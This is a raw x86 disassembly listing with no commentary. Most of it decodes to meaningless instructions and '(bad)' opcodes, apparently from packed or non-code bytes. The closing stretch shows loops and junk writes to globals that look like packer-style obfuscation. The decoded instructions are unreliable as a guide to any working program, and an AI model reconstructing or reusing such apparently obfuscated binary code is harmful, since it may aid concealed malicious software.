  40eab8:	inc    ebx
  40eab9:	daa    
  40eaba:	ret    0xa24d
  40eabd:	push   eax
  40eabe:	xchg   ebp,eax
  40eabf:	mov    ebx,0x787e9266
  40eac4:	ja     0x40eb13
  40eac6:	mov    eax,ds:0xe63dd73c
  40eacb:	and    DWORD PTR [ecx],0xfc8f1e92
  40ead1:	dec    ecx
  40ead2:	in     al,dx
  40ead3:	mov    BYTE PTR [ebp-0x53],dl
  40ead6:	mov    ch,0x34
  40ead8:	lods   al,BYTE PTR ds:[esi]
  40ead9:	inc    DWORD PTR [edx]
  40eadb:	pop    ecx
  40eadc:	repz add DWORD PTR [edi],edx
  40eadf:	scas   al,BYTE PTR es:[edi]
  40eae0:	pop    eax
  40eae1:	dec    ebp
  40eae2:	mov    bl,0xb3
  40eae4:	jmp    0x9b0d958e
  40eae9:	cmp    eax,0x41f6efef
  40eaee:	mov    ah,0xcf
  40eaf0:	mov    cl,BYTE PTR [bx-0x80]
  40eaf4:	shl    DWORD PTR [esi-0x4c],0x8c
  40eaf8:	xchg   esi,eax
  40eaf9:	fist   DWORD PTR [ebx+0x50]
  40eafc:	fild   WORD PTR [esi-0x6e]
  40eaff:	mov    ebp,0x2de99f5e
  40eb04:	shl    dl,1
  40eb06:	xchg   dl,cl
  40eb08:	stos   BYTE PTR es:[edi],al
  40eb09:	loope  0x40eac8
  40eb0b:	mov    eax,ds:0xff4562fe
  40eb10:	sub    BYTE PTR [edi-0x584dcb2e],cl
  40eb16:	sahf   
  40eb17:	iret   
  40eb18:	sahf   
  40eb19:	xchg   ecx,eax
  40eb1a:	cdq    
  40eb1b:	push   eax
  40eb1c:	xchg   ebp,eax
  40eb1d:	jae    0x40eb37
  40eb1f:	mov    BYTE PTR ds:0x633def8a,ah
  40eb25:	mov    ebx,0x32f9e42b
  40eb2a:	psubsb mm3,QWORD PTR [edi]
  40eb2d:	cmp    DWORD PTR [ebx-0x7159e7d],edi
  40eb33:	inc    esi
  40eb34:	cmp    BYTE PTR [ecx-0x7ad204d3],bh
  40eb3a:	and    eax,0xab1988dd
  40eb3f:	dec    ebx
  40eb40:	daa    
  40eb41:	jns    0x40eb96
  40eb43:	in     eax,dx
  40eb44:	push   esi
  40eb45:	jl     0x40eb2d
  40eb47:	sub    BYTE PTR [edx-0x671224ce],0xc8
  40eb4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb4f:	les    edx,FWORD PTR [ebx+ebx*1-0x34]
  40eb53:	dec    eax
  40eb54:	cdq    
  40eb55:	icebp  
  40eb56:	mov    esp,0xcc99f5ee
  40eb5b:	fst    DWORD PTR [ecx+esi*4-0xafd73b]
  40eb62:	jle    0x40eaeb
  40eb64:	(bad)
  40eb67:	push   esi
  40eb68:	add    DWORD PTR [eax],esp
  40eb6a:	sbb    BYTE PTR [eax],0x5d
  40eb6d:	rdpmc  
  40eb6f:	mov    ds:0x41e72b18,al
  40eb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb75:	xchg   edx,eax
  40eb76:	cld    
  40eb77:	push   esi
  40eb78:	or     edi,DWORD PTR [edi]
  40eb7a:	mov    BYTE PTR [edx+0x27],ah
  40eb7d:	(bad)  
  40eb7e:	(bad)  
  40eb7f:	ficom  WORD PTR ds:0x1843004b
  40eb85:	dec    esi
  40eb86:	mov    ds,edx
  40eb88:	jns    0x40eb10
  40eb8a:	(bad)  
  40eb8b:	repnz add esp,DWORD PTR [ecx+0x50]
  40eb8f:	mov    cl,0x1f
  40eb91:	test   BYTE PTR [ecx],dl
  40eb93:	out    dx,eax
  40eb94:	mov    eax,ds:0xff9fc0e3
  40eb99:	mov    cl,BYTE PTR [esi-0x31cf1068]
  40eb9f:	jne    0x40eb51
  40eba1:	jno    0x40ebbe
  40eba3:	sar    BYTE PTR [ebx],cl
  40eba5:	loopne 0x40ebfb
  40eba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eba8:	sbb    eax,0xffffff9f
  40ebab:	(bad)  [edx+0x18]
  40ebaf:	das    
  40ebb0:	mov    WORD PTR [eiz*4-0x6d0e300e],es
  40ebb7:	mov    ecx,?
  40ebb9:	scas   eax,DWORD PTR es:[edi]
  40ebba:	inc    edi
  40ebbb:	aaa    
  40ebbc:	sbb    eax,DWORD PTR [edi+0x1ed569d6]
  40ebc2:	cli    
  40ebc3:	loope  0x40eb45
  40ebc5:	jb     0x40eb6d
  40ebc7:	sbb    bh,BYTE PTR [eax-0x55a8419e]
  40ebcd:	cmc    
  40ebce:	ret    0x9be3
  40ebd1:	std    
  40ebd2:	inc    esp
  40ebd3:	mov    cl,0x65
  40ebd5:	xchg   edi,eax
  40ebd6:	ja     0x40ec32
  40ebd8:	push   edi
  40ebd9:	ret    
  40ebda:	add    al,0x77
  40ebdc:	repnz add cl,bh
  40ebdf:	(bad)  
  40ebe0:	cmp    BYTE PTR [edi+0x24560f9c],ah
  40ebe6:	push   ebx
  40ebe7:	in     eax,dx
  40ebe8:	sbb    al,0xb6
  40ebea:	sbb    bl,bh
  40ebec:	iret   
  40ebed:	mov    edx,0x128c9991
  40ebf2:	add    dh,BYTE PTR [eax+0x825e979]
  40ebf8:	push   ebp
  40ebf9:	mov    ah,0xf6
  40ebfb:	popa   
  40ebfc:	lock fs cmp dl,ch
  40ec00:	sti    
  40ec01:	lods   eax,DWORD PTR ds:[esi]
  40ec02:	mov    eax,ds:0x56627b1d
  40ec07:	mul    BYTE PTR [edx+0x48]
  40ec0a:	ret    
  40ec0b:	mov    ds:0xb593c44b,eax
  40ec10:	and    eax,0xc71f0373
  40ec15:	aas    
  40ec16:	mov    al,BYTE PTR [eax+ebx*8]
  40ec19:	bound  eax,QWORD PTR [eax-0x68867a79]
  40ec1f:	jb     0x40ec1c
  40ec21:	inc    ebp
  40ec22:	popf   
  40ec23:	rcl    DWORD PTR [esi+0x51],cl
  40ec26:	or     eax,0x597aa3cf
  40ec2b:	add    edi,DWORD PTR [ebp+0xf43e12f]
  40ec31:	xchg   esp,eax
  40ec32:	xchg   DWORD PTR [edx],esi
  40ec34:	sub    al,0xf0
  40ec36:	(bad)  
  40ec37:	cmc    
  40ec38:	push   edi
  40ec39:	pop    esp
  40ec3a:	rol    DWORD PTR [eax],0xf9
  40ec3d:	loop   0x40ec01
  40ec3f:	into   
  40ec40:	(bad)  
  40ec41:	cli    
  40ec42:	sbb    al,0x49
  40ec44:	add    dh,ah
  40ec46:	dec    ecx
  40ec47:	pop    ds
  40ec48:	sbb    al,0x8e
  40ec4a:	mov    al,0xc4
  40ec4c:	test   cl,cl
  40ec4e:	add    ah,BYTE PTR [edi-0x1f]
  40ec51:	daa    
  40ec52:	and    ebp,DWORD PTR [eax+0x4aa96ece]
  40ec58:	ss adc eax,0xad3b97de
  40ec5e:	xor    edi,DWORD PTR [eax+esi*1-0x5d]
  40ec62:	dec    ebp
  40ec63:	pop    edx
  40ec64:	loope  0x40ebee
  40ec66:	out    0xff,eax
  40ec68:	in     eax,0x2
  40ec6a:	in     al,0x83
  40ec6c:	add    edx,DWORD PTR [ebp+0xaf395c8]
  40ec72:	pop    edx
  40ec73:	push   ecx
  40ec74:	add    ebp,DWORD PTR [edi+0x2421fa1a]
  40ec7a:	inc    ebp
  40ec7b:	add    BYTE PTR [edi+0x1724b8fa],ah
  40ec81:	fmul   QWORD PTR [edx+ebx*8-0x4d]
  40ec85:	mov    ebp,0xa733a92e
  40ec8a:	pop    ss
  40ec8b:	sar    DWORD PTR [edx+esi*1-0x70],cl
  40ec8f:	mov    ds,WORD PTR [edx+0x5d]
  40ec92:	mov    cl,0x8a
  40ec94:	and    DWORD PTR [ebp+0x151884f5],0xe58caee6
  40ec9e:	mov    bl,0x62
  40eca0:	cmp    bl,dh
  40eca2:	dec    eax
  40eca3:	lds    esi,FWORD PTR [esi-0x5c0ddd3c]
  40eca9:	pop    ss
  40ecaa:	mov    cl,0x2a
  40ecac:	xor    ah,bh
  40ecae:	push   0xffffff84
  40ecb0:	dec    esi
  40ecb1:	pop    ebx
  40ecb2:	mov    ebp,0xa6f0d4fc
  40ecb7:	add    eax,0x8b9c64e4
  40ecbc:	loope  0x40eccd
  40ecbe:	hlt    
  40ecbf:	adc    eax,0x5caa9d74
  40ecc4:	push   es
  40ecc5:	movzx  esi,BYTE PTR [ebx-0x63f1885c]
  40eccc:	outs   dx,DWORD PTR ds:[esi]
  40eccd:	lods   eax,DWORD PTR ds:[esi]
  40ecce:	ret    0x82c
  40ecd1:	stc    
  40ecd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd3:	jns    0x40ed2d
  40ecd5:	dec    esi
  40ecd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd7:	mov    dl,0x16
  40ecd9:	ins    DWORD PTR es:[edi],dx
  40ecda:	mov    esp,0x93ad2550
  40ecdf:	mov    ds:0x1127c40e,eax
  40ece4:	shr    DWORD PTR [ecx],1
  40ece6:	lods   eax,DWORD PTR ds:[esi]
  40ece7:	fstp   DWORD PTR [eax+0x15dab947]
  40eced:	icebp  
  40ecee:	frstor [edx-0x5ac5d63b]
  40ecf4:	aad    0x55
  40ecf6:	test   eax,0x9c0ded28
  40ecfb:	out    dx,eax
  40ecfc:	cmp    edi,DWORD PTR [esp+eax*1+0x46]
  40ed00:	xor    ecx,edi
  40ed02:	or     al,0x55
  40ed04:	push   cs
  40ed05:	sbb    ecx,DWORD PTR [edx]
  40ed07:	mov    ah,0xc1
  40ed09:	cmc    
  40ed0a:	dec    BYTE PTR [eax-0x4d]
  40ed0d:	ret    
  40ed0e:	jge    0x40ed68
  40ed10:	mov    edx,es
  40ed12:	pop    ebp
  40ed13:	lods   eax,DWORD PTR ds:[esi]
  40ed14:	xchg   edi,eax
  40ed15:	pusha  
  40ed16:	stc    
  40ed17:	sub    DWORD PTR [eax],0x118e5bb9
  40ed1d:	rcr    BYTE PTR [ebx+0x13],cl
  40ed20:	xlat   BYTE PTR ds:[ebx]
  40ed21:	inc    eax
  40ed22:	pop    esi
  40ed23:	rol    BYTE PTR es:[eax+0x7e],1
  40ed27:	xor    dh,BYTE PTR [edx]
  40ed29:	and    eax,0x6bf8dfe7
  40ed2e:	fistp  QWORD PTR [ecx]
  40ed30:	sub    DWORD PTR ds:0x2f79375,0x5e
  40ed37:	repnz out 0x3b,al
  40ed3a:	loopne 0x40ed99
  40ed3c:	pop    es
  40ed3d:	ret    0x70be
  40ed40:	pusha  
  40ed41:	aad    0x6f
  40ed43:	push   0xf1e3165e
  40ed48:	mov    al,0xc
  40ed4a:	fiadd  DWORD PTR [ebx+0x1e79c8a6]
  40ed50:	loope  0x40ecf6
  40ed52:	or     edi,ecx
  40ed54:	ja     0x40ed43
  40ed56:	ins    BYTE PTR es:[edi],dx
  40ed57:	add    DWORD PTR [eax-0x55b9a7dc],0x45878f4e
  40ed61:	mov    al,ds:0x8df320fd
  40ed66:	xchg   esi,eax
  40ed67:	sahf   
  40ed68:	jg     0x40ed29
  40ed6a:	test   BYTE PTR [ebp-0x6a],0x7a
  40ed6e:	cmc    
  40ed6f:	xchg   BYTE PTR [edi-0x226a2869],ah
  40ed75:	push   es
  40ed76:	aaa    
  40ed77:	lock or eax,0x6e1dfc7d
  40ed7d:	int3   
  40ed7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed7f:	xor    cl,BYTE PTR [edx+0x759293da]
  40ed85:	xchg   ebp,eax
  40ed86:	es push 0x8fec93eb
  40ed8c:	xor    DWORD PTR [eax+0x34],0x48321530
  40ed93:	jo     0x40ed61
  40ed95:	popf   
  40ed96:	push   eax
  40ed97:	aas    
  40ed98:	dec    edi
  40ed99:	push   eax
  40ed9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed9b:	stos   BYTE PTR es:[edi],al
  40ed9c:	cmp    dl,cl
  40ed9e:	adc    al,0x3a
  40eda0:	mov    dl,0xa6
  40eda2:	jb     0x40ee0f
  40eda4:	(bad)  
  40eda5:	jmp    0x7ca9e13e
  40edaa:	xor    al,0x89
  40edac:	aad    0xc2
  40edae:	dec    edi
  40edaf:	test   eax,0xa57dd059
  40edb4:	repz xchg esi,eax
  40edb6:	jns    0x40ed4a
  40edb8:	mov    esi,0x8dd99649
  40edbd:	rcr    edx,1
  40edbf:	lahf   
  40edc0:	and    bl,BYTE PTR [ebp+0x6]
  40edc3:	lods   eax,DWORD PTR ds:[esi]
  40edc4:	lahf   
  40edc5:	xor    bl,BYTE PTR [ecx-0x12]
  40edc8:	push   ds
  40edc9:	add    al,0xf7
  40edcb:	dec    ebp
  40edcc:	and    eax,0x1d44c285
  40edd1:	cli    
  40edd2:	or     esi,DWORD PTR ds:0x60e18833
  40edd8:	and    eax,0x7390323
  40eddd:	shl    DWORD PTR [ebx-0x4b4fcf4b],1
  40ede3:	in     eax,0x73
  40ede5:	cmp    ebx,ebx
  40ede7:	sub    eax,DWORD PTR [ebp-0x2cac3168]
  40eded:	mov    di,0x15a4
  40edf1:	lods   al,BYTE PTR ds:[esi]
  40edf2:	aaa    
  40edf3:	fstp   QWORD PTR [edi]
  40edf5:	inc    ebp
  40edf6:	adc    eax,0x1bb0ddbc
  40edfb:	adc    edi,edi
  40edfd:	push   ds
  40edfe:	ds mov cl,0xe5
  40ee01:	gs jge 0x40edba
  40ee04:	in     al,0xa9
  40ee06:	mov    bl,0x49
  40ee08:	fst    QWORD PTR [eax-0x1f3af1b5]
  40ee0e:	mov    ds:0x89bdab7b,al
  40ee13:	mov    edi,gs
  40ee15:	pop    ecx
  40ee16:	call   0xe54ecb7
  40ee1b:	and    al,0x1a
  40ee1d:	je     0x40ee50
  40ee1f:	adc    al,dh
  40ee21:	push   ebx
  40ee22:	ret    
  40ee23:	test   BYTE PTR [eax+0xb],0x76
  40ee27:	outs   dx,DWORD PTR ds:[esi]
  40ee28:	dec    edi
  40ee29:	(bad)  
  40ee2a:	ja     0x40ee1b
  40ee2c:	test   al,0x41
  40ee2e:	add    bh,BYTE PTR [esi+eiz*1-0x5082e036]
  40ee35:	xchg   edi,eax
  40ee36:	scas   eax,DWORD PTR es:[edi]
  40ee37:	aam    0xcd
  40ee39:	int3   
  40ee3a:	pop    ds
  40ee3b:	sbb    DWORD PTR [ebx+0x28],edi
  40ee3e:	std    
  40ee3f:	dec    ebp
  40ee40:	sbb    al,0x78
  40ee42:	test   BYTE PTR [edx-0x6f89e43b],dh
  40ee48:	lods   eax,DWORD PTR ds:[esi]
  40ee49:	sahf   
  40ee4a:	js     0x40ee25
  40ee4c:	jecxz  0x40ede2
  40ee4e:	gs and eax,0x7cfff7b3
  40ee54:	out    0x64,al
  40ee56:	pusha  
  40ee57:	or     DWORD PTR [edx+esi*2],edi
  40ee5a:	mov    ebx,0xb55486b5
  40ee5f:	nop
  40ee60:	adc    ah,ch
  40ee62:	or     al,BYTE PTR [ebx]
  40ee64:	xchg   BYTE PTR [ecx+0x76374793],dh
  40ee6a:	std    
  40ee6b:	repz mov ebp,0xc89ee2da
  40ee71:	cs mov bh,0x56
  40ee74:	xchg   ah,bh
  40ee76:	sbb    ch,BYTE PTR [ebx]
  40ee78:	dec    esp
  40ee79:	mov    ah,0xae
  40ee7b:	adc    esp,DWORD PTR [ebp+0x2c8ce08b]
  40ee81:	outs   dx,BYTE PTR ds:[esi]
  40ee82:	mov    ss,WORD PTR ds:0xa72c6113
  40ee88:	cmp    dl,bl
  40ee8a:	xchg   ecx,eax
  40ee8b:	vpaddusw xmm0,xmm6,xmm1
  40ee8f:	dec    ecx
  40ee90:	jno    0x40ee62
  40ee92:	inc    eax
  40ee93:	imul   esi,esp,0xec2940ff
  40ee99:	rcr    esp,cl
  40ee9b:	int3   
  40ee9c:	cmc    
  40ee9d:	outs   dx,BYTE PTR ds:[esi]
  40ee9e:	scas   eax,DWORD PTR es:[edi]
  40ee9f:	mov    bh,0xa6
  40eea1:	xchg   esp,eax
  40eea2:	adc    BYTE PTR [eax+eiz*2],cl
  40eea5:	sbb    BYTE PTR [ebx+ebx*4+0x9],ah
  40eea9:	stc    
  40eeaa:	xchg   edx,eax
  40eeab:	xor    BYTE PTR [ecx-0x8e8fdd7],dl
  40eeb1:	mov    eax,ds:0xd7033fc
  40eeb6:	fcom   QWORD PTR [edx-0x242d92f0]
  40eebc:	mov    BYTE PTR [edi],bh
  40eebe:	dec    ecx
  40eebf:	push   cs
  40eec0:	mov    esp,0xca1798b5
  40eec5:	or     BYTE PTR [eax+0xff9487b],dh
  40eecb:	adc    esi,DWORD PTR [ecx+0x1418de96]
  40eed1:	je     0x40ef38
  40eed3:	cmp    bl,BYTE PTR [edi+eax*1+0x56f45cab]
  40eeda:	sub    al,0x21
  40eedc:	or     esi,DWORD PTR [edx+esi*8-0x6efb0b6f]
  40eee3:	or     BYTE PTR [ecx+0x63],bl
  40eee6:	mov    ecx,0xe9d40744
  40eeeb:	sbb    dh,BYTE PTR ds:0x3ed5deeb
  40eef1:	mov    BYTE PTR [esi+esi*4],0xea
  40eef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eef6:	rol    BYTE PTR [edx],cl
  40eef8:	(bad)
  40eefc:	sbb    ch,BYTE PTR [eax+esi*4-0x1d59092a]
  40ef03:	fidivr DWORD PTR [eax-0x399cbe5a]
  40ef09:	or     esp,ebp
  40ef0b:	fdivr  DWORD PTR [ebp+0x1e]
  40ef0e:	repz sub DWORD PTR [edi-0xb9c7040],edx
  40ef15:	or     al,0xc
  40ef17:	xchg   esp,eax
  40ef18:	pusha  
  40ef19:	icebp  
  40ef1a:	lock dec esp
  40ef1c:	cmp    eax,0x9bc8cd35
  40ef21:	inc    esp
  40ef22:	cs scas eax,DWORD PTR es:[edi]
  40ef24:	adc    ch,BYTE PTR [esi+0x13]
  40ef27:	enter  0x2502,0x79
  40ef2b:	jne    0x40eeb9
  40ef2d:	mov    ch,0x62
  40ef2f:	ins    DWORD PTR es:[edi],dx
  40ef30:	retf   
  40ef31:	push   cs
  40ef32:	das    
  40ef33:	je     0x40ef35
  40ef35:	mov    cs,WORD PTR [di]
  40ef38:	push   ss
  40ef39:	scas   al,BYTE PTR es:[edi]
  40ef3a:	push   DWORD PTR [edi]
  40ef3c:	xchg   edx,eax
  40ef3d:	mov    cl,0xf4
  40ef3f:	pusha  
  40ef40:	or     ebp,DWORD PTR [ebx+0x4d]
  40ef43:	imul   ebx,DWORD PTR [esi],0x75c3c059
  40ef49:	adc    ebp,DWORD PTR [ecx-0x2bf076cf]
  40ef4f:	or     eax,0x7a33ed01
  40ef54:	inc    ebx
  40ef55:	fwait
  40ef56:	push   edi
  40ef57:	cwde   
  40ef58:	xlat   BYTE PTR ds:[ebx]
  40ef59:	fmul   DWORD PTR ds:0xf15be493
  40ef5f:	mov    dh,0xef
  40ef61:	mov    al,ds:0x18091ad2
  40ef66:	jb     0x40ef5d
  40ef68:	inc    ebx
  40ef69:	cmp    esp,DWORD PTR [ebx]
  40ef6b:	call   0x17dc5884
  40ef70:	ss push cs
  40ef72:	mov    ?,WORD PTR [esi+0x7b]
  40ef75:	mov    ebx,0x48217de1
  40ef7a:	ja     0x40effb
  40ef7c:	jno    0x40ef4e
  40ef7e:	sbb    eax,0x133c7bf9
  40ef83:	(bad)  
  40ef85:	pop    ebx
  40ef87:	and    bl,cl
  40ef89:	or     al,0xa9
  40ef8b:	mov    gs,eax
  40ef8d:	cmp    eax,0x5d98e5ff
  40ef92:	mov    dh,0xb7
  40ef94:	std    
  40ef95:	cmp    BYTE PTR [edx],0xfd
  40ef98:	popa   
  40ef99:	(bad)  
  40ef9a:	out    0xe2,eax
  40ef9c:	aam    0xc1
  40ef9e:	xor    DWORD PTR [edi+esi*4],eax
  40efa1:	or     esi,esp
  40efa3:	into   
  40efa4:	inc    edi
  40efa5:	sbb    BYTE PTR [edi],0x3
  40efa8:	(bad)  
  40efa9:	stos   DWORD PTR es:[edi],eax
  40efaa:	nop
  40efab:	mov    DWORD PTR [edx+0x2e],esp
  40efae:	inc    ebx
  40efaf:	push   0x846a06bb
  40efb4:	dec    ebx
  40efb5:	call   0xf7bae8d9
  40efba:	jmp    0x40ef9b
  40efbc:	ins    BYTE PTR es:[edi],dx
  40efbd:	push   ds
  40efbe:	popa   
  40efbf:	xor    al,0x53
  40efc1:	xchg   ecx,eax
  40efc2:	push   eax
  40efc3:	loope  0x40ef8a
  40efc5:	sbb    ecx,ecx
  40efc7:	nop    DWORD PTR ds:0xdceee1fb
  40efce:	fstp   st(1)
  40efd0:	mov    esp,DWORD PTR [edi+0x700e33f4]
  40efd6:	and    eax,DWORD PTR [ecx]
  40efd8:	jne    0x40efee
  40efda:	adc    eax,DWORD PTR [ebx+0x164cf6d9]
  40efe0:	xchg   ebx,eax
  40efe1:	xchg   edx,eax
  40efe2:	xchg   esp,eax
  40efe3:	sub    edi,DWORD PTR [edx-0xa]
  40efe6:	jno    0x40ef74
  40efe8:	dec    ebp
  40efe9:	inc    ecx
  40efea:	daa    
  40efeb:	xchg   ecx,eax
  40efec:	call   0xdb271469
  40eff1:	aaa    
  40eff2:	mov    ss,esi
  40eff4:	mov    ah,0x65
  40eff6:	mov    bh,0x50
  40eff8:	mov    ah,0xa2
  40effa:	pop    esi
  40effb:	sbb    eax,0x881ed108
  40f000:	(bad)  
  40f001:	cmp    edx,edx
  40f003:	xchg   ebp,eax
  40f004:	scas   eax,DWORD PTR es:[edi]
  40f005:	popf   
  40f006:	add    DWORD PTR [esi-0x6cdd4ba],eax
  40f00c:	jl     0x40f034
  40f00e:	fdiv   DWORD PTR [edx+0x6]
  40f011:	into   
  40f012:	retf   
  40f013:	push   edi
  40f014:	iret   
  40f015:	shl    DWORD PTR [edx],1
  40f017:	xor    BYTE PTR [ebx+0x63c05a9a],bh
  40f01d:	push   ds
  40f01e:	popa   
  40f01f:	stos   BYTE PTR es:[edi],al
  40f020:	mov    ebp,0x3b3160f8
  40f025:	pop    es
  40f026:	outs   dx,DWORD PTR ds:[esi]
  40f027:	cld    
  40f028:	pop    ebx
  40f029:	stc    
  40f02a:	div    edi
  40f02c:	das    
  40f02d:	sub    BYTE PTR [ebp+0x717388d3],bl
  40f033:	ja     0x40f059
  40f035:	sub    BYTE PTR [edi],bh
  40f037:	mov    bh,bl
  40f039:	push   cs
  40f03a:	lods   eax,DWORD PTR ds:[esi]
  40f03b:	out    dx,al
  40f03c:	inc    eax
  40f03d:	pop    esi
  40f03e:	(bad)  
  40f03f:	(bad)  [eax+esi*1+0x1b]
  40f043:	mov    eax,0xeef38080
  40f048:	dec    esp
  40f049:	push   0x38720224
  40f04e:	loope  0x40f0c3
  40f050:	test   eax,0x6121be16
  40f055:	add    al,0xc7
  40f057:	pusha  
  40f058:	in     al,0x79
  40f05a:	sbb    al,0x7e
  40f05c:	cmp    eax,0xc46683ce
  40f061:	inc    ecx
  40f062:	jg     0x40f02b
  40f064:	push   0x26
  40f066:	mul    DWORD PTR [eax+0x3d]
  40f069:	imul   ecx,DWORD PTR [eax+0x7badc767],0xfffffffe
  40f070:	call   0xf4f642a1
  40f075:	ja     0x40f099
  40f077:	dec    eax
  40f078:	int    0x57
  40f07a:	cld    
  40f07b:	mov    ds:0xad994a27,al
  40f080:	cmp    eax,0x381870d5
  40f085:	in     al,0xa
  40f087:	mov    esi,0x8231ebba
  40f08c:	icebp  
  40f08d:	and    eax,0x77fa0e82
  40f092:	jno    0x40f073
  40f094:	xchg   edi,eax
  40f095:	pop    esi
  40f096:	inc    ebp
  40f097:	repz push 0x9ac19208
  40f09d:	(bad)
  40f0a2:	out    0xda,eax
  40f0a4:	push   ebx
  40f0a5:	jmp    0x13f55fdc
  40f0aa:	cmp    eax,0xfef66e21
  40f0af:	ds lahf 
  40f0b1:	hlt    
  40f0b2:	and    esi,DWORD PTR [edi]
  40f0b4:	cmp    al,0x2e
  40f0b6:	idiv   DWORD PTR [esi]
  40f0b8:	retf   0x51c2
  40f0bb:	sbb    al,bh
  40f0bd:	pop    es
  40f0be:	mov    ch,0x2f
  40f0c0:	mov    ah,0xcc
  40f0c2:	pop    ss
  40f0c3:	into   
  40f0c4:	jbe    0x40f0f6
  40f0c6:	sub    al,0xc3
  40f0c8:	adc    ecx,DWORD PTR [ebx+0x4be20639]
  40f0ce:	sahf   
  40f0cf:	mov    cl,0x19
  40f0d1:	movd   mm6,esi
  40f0d4:	dec    edx
  40f0d5:	jno    0x40f0f9
  40f0d7:	adc    esi,ebx
  40f0d9:	cmp    esi,DWORD PTR [ebx]
  40f0db:	aad    0x5
  40f0dd:	loop   0x40f136
  40f0df:	mov    ecx,0x29525b2b
  40f0e4:	pop    es
  40f0e5:	push   esp
  40f0e6:	mov    eax,ds:0x291c5723
  40f0eb:	pop    ebx
  40f0ec:	loop   0x40f093
  40f0ee:	sub    BYTE PTR [edx+0x3289cbd2],0x3e
  40f0f5:	pop    ebp
  40f0f6:	xchg   esi,eax
  40f0f7:	lds    esp,FWORD PTR [edx-0x70615436]
  40f0fd:	push   ebp
  40f0fe:	leave  
  40f0ff:	mov    dl,0xae
  40f101:	push   es
  40f102:	call   0x280d:0xde0590a6
  40f109:	aaa    
  40f10a:	(bad)  
  40f10b:	and    al,0x35
  40f10d:	icebp  
  40f10e:	imul   ecx,DWORD PTR [eax+0x8],0xffffffdc
  40f112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f113:	daa    
  40f114:	mov    edi,0x3b53249c
  40f119:	(bad)  
  40f11b:	inc    edi
  40f11c:	xchg   ecx,eax
  40f11d:	je     0x40f18d
  40f11f:	sub    ch,BYTE PTR [esi+0x3]
  40f122:	mov    ds:0x33d48161,eax
  40f127:	fiadd  WORD PTR [ecx+0x42a01005]
  40f12d:	add    BYTE PTR [eax],bl
  40f12f:	rol    BYTE PTR [edx+0x0],1
  40f132:	add    ebx,edi
  40f134:	and    DWORD PTR ds:0x42c008,0x0
  40f13e:	mov    eax,ds:0x42c008
  40f143:	inc    eax
  40f144:	mov    ds:0x42c008,eax
  40f149:	cmp    DWORD PTR ds:0x42c008,0xe
  40f150:	ja     0x40f191
  40f156:	jmp    0x40f16c
  40f15b:	push   DWORD PTR [ebp-0x28]
  40f15e:	push   0x7f19
  40f163:	push   DWORD PTR [ebp-0x28]
  40f166:	call   DWORD PTR ds:0x43004b
  40f16c:	cmp    DWORD PTR ds:0x42c008,0xd
  40f173:	jne    0x40f184
  40f179:	mov    eax,ds:0x42c008
  40f17e:	inc    eax
  40f17f:	mov    ds:0x42c008,eax
  40f184:	cmp    DWORD PTR ds:0x42c008,0x1b
  40f18b:	jb     0x40f13e
  40f191:	mov    eax,DWORD PTR [ebp-0x24]
  40f194:	sub    eax,edi
  40f196:	lea    ecx,[ebx-0x3272ec]
  40f19c:	mov    DWORD PTR ds:0x42d000,0x77e
  40f1a6:	xor    eax,esi
  40f1a8:	or     DWORD PTR ds:0x42b004,0x429020
  40f1b2:	xor    ecx,esi
  40f1b4:	mov    DWORD PTR ds:0x42c008,0x6bd4
  40f1be:	cmp    ecx,eax
  40f1c0:	mov    DWORD PTR ds:0x42901c,0x68e9
  40f1ca:	je     0x411851
  40f1d0:	and    DWORD PTR ds:0x42a01c,0x0
  40f1da:	xor    eax,eax
  40f1dc:	add    eax,DWORD PTR ds:0x42a01c
  40f1e2:	inc    eax
  40f1e3:	mov    ds:0x42a01c,eax
  40f1e8:	cmp    DWORD PTR ds:0x42a01c,0x13
  40f1ef:	jg     0x40f217
  40f1f5:	jmp    0x40f20a
  40f1fa:	push   0x42c004
  40f1ff:	push   0x42f169
  40f204:	call   DWORD PTR ds:0x43000b
  40f20a:	cmp    DWORD PTR ds:0x42a01c,0x12
  40f211:	jb     0x40f1da
  40f217:	mov    eax,DWORD PTR [ebp-0x4]
  40f21a:	xor    eax,esi
  40f21c:	sub    DWORD PTR ds:0x42d00c,0x11b5
  40f226:	add    eax,edi
  40f228:	cmp    ebx,eax
  40f22a:	jne    0x40f40e
  40f230:	push   DWORD PTR [ebp+0x8]
  40f233:	call   0x424860
  40f238:	mov    DWORD PTR [ebp-0x14],eax
  40f23b:	or     DWORD PTR ds:0x42c018,0xd46
  40f245:	mov    eax,DWORD PTR [ebp-0x4]
  40f248:	or     DWORD PTR ds:0x42d00c,ebx
  40f24e:	mov    ecx,DWORD PTR [ebp-0x14]
  40f251:	adc    DWORD PTR ds:0x429008,0x4a78
  40f25b:	xor    eax,esi
  40f25d:	xor    DWORD PTR ds:0x42b018,0x54c5
  40f267:	add    eax,edi
  40f269:	mov    DWORD PTR ds:0x42c00c,0x1824
  40f273:	cmp    ecx,eax
  40f275:	je     0x4118bc
  40f27b:	push   DWORD PTR [ebp-0x14]
  40f27e:	or     DWORD PTR ds:0x42b008,0x429004
  40f288:	push   DWORD PTR [ebp+0x8]
  40f28b:	and    DWORD PTR ds:0x42c008,0x42a014
  40f295:	call   0x424932
  40f29a:	dec    ecx
  40f29b:	mov    DWORD PTR [ebp-0x14],eax
  40f29e:	xor    DWORD PTR ds:0x42c004,ecx
  40f2a4:	mov    eax,DWORD PTR [ebp-0x4]
  40f2a7:	adc    DWORD PTR ds:0x42a008,edx
  40f2ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40f2b0:	sub    DWORD PTR ds:0x42a010,0x429020
  40f2ba:	xor    eax,esi
  40f2bc:	adc    DWORD PTR ds:0x42a010,0x42901c
  40f2c6:	add    eax,edi
  40f2c8:	mov    DWORD PTR ds:0x42b008,0x358c
  40f2d2:	cmp    ecx,eax
  40f2d4:	mov    DWORD PTR ds:0x42a018,0x235e
  40f2de:	je     0x4118bc
  40f2e4:	xor    eax,ecx
  40f2e6:	mov    eax,DWORD PTR [ebp-0x14]
